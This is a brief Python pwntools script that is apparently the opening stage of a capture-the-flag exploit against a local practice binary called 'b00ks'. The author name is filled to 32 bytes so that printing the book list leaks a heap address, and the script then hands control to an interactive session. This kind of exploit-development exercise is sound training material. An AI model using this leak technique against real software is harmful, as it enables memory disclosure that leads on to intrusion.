#!/usr/bin/env python2
from pwn import *
sh = process('./b00ks')
context.log_level = 'debug'

sh.recv()
sh.sendline('a'*32)

def leak_book():
    sh.recvuntil('> ')
    sh.sendline('1')
    sh.recv()
    sh.sendline('32')
    sh.recvuntil(": ")
    sh.sendline('b'*32)
    sh.recvuntil(': ')
    sh.sendline('32')
    sh.recv()
    sh.sendline('c'*32)
    sh.recvuntil('> ')
    sh.sendline('4')
    sh.recvuntil('a'*32)
    book1_addr = u64(sh.recv()[:6].ljust(8,'\x00'))
    log.info('book1_addr: '+hex(book1_addr))
    return hex(book1_addr)

book1_addr = leak_book()


sh.interactive()
